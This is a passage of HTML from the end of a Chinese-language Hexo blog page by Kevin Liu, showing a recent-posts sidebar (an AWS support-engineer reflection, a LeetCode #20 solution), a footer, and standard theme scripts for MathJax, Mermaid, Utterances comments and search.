datetime="2024-07-03T07:05:37.000Z" title="發表於 2024-07-03 15:05:37">2024-07-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c0ef3a5f.html" title="近一年半的 AWS Cloud Support Engineer 心得記錄">近一年半的 AWS Cloud Support Engineer 心得記錄</a><time datetime="2024-07-03T04:26:11.000Z" title="發表於 2024-07-03 12:26:11">2024-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/92b56b8e.html" title="有效的括號 | Easy |LeetCode#20. Valid Parentheses"><img src="/img/LeetCode/20/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="有效的括號 | Easy |LeetCode#20. Valid Parentheses"/></a><div class="content"><a class="title" href="/posts/92b56b8e.html" title="有效的括號 | Easy |LeetCode#20. Valid Parentheses">有效的括號 | Easy |LeetCode#20. Valid Parentheses</a><time datetime="2024-06-28T08:16:56.000Z" title="發表於 2024-06-28 16:16:56">2024-06-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By Kevin Liu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主題 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="閱讀模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="簡繁轉換">EN</button><button id="darkmode" type="button" title="淺色和深色模式轉換"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="單欄和雙欄切換"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="設定"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目錄"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直達評論"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到頂部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'dark'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addModeChange('mermaid', runMermaid)
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>function loadUtterances () {
+  let ele = document.createElement('script')
+  ele.setAttribute('id', 'utterances_comment')
+  ele.setAttribute('src', 'https://utteranc.es/client.js')
+  ele.setAttribute('repo', 'leozzmc/Blog_Reply')
+  ele.setAttribute('issue-term', 'pathname')
+  let nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
+  ele.setAttribute('theme', nowTheme)
+  ele.setAttribute('crossorigin', 'anonymous')
+  ele.setAttribute('async', 'true')
+  document.getElementById('utterances-wrap').insertAdjacentElement('afterbegin',ele)
+}
+
+function utterancesTheme (theme) {
+  const iframe = document.querySelector('.utterances-frame')
+  if (iframe) {
+    const theme = theme === 'dark' ? 'photon-dark' : 'github-light'
+    const message = {
+      type: 'set-theme',
+      theme: theme
+    };
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+}
+
+btf.addModeChange('utterances', utterancesTheme)
+
+if ('Utterances' === 'Utterances' || !false) {
+  if (false) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+  else loadUtterances()
+} else {
+  function loadOtherComment () {
+    loadUtterances()
+  }
+}</script></div><script data-pjax src="/self/btf.js"></script><script data-pjax src="/self/tw_en.js"></script><script id="canvas_nest" defer="defer" color="34,34,34" opacity="0.8" zIndex="-1" count="350" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="👍,👾,💊,🧪,👁️" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜尋</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  資料庫載入中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜尋文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
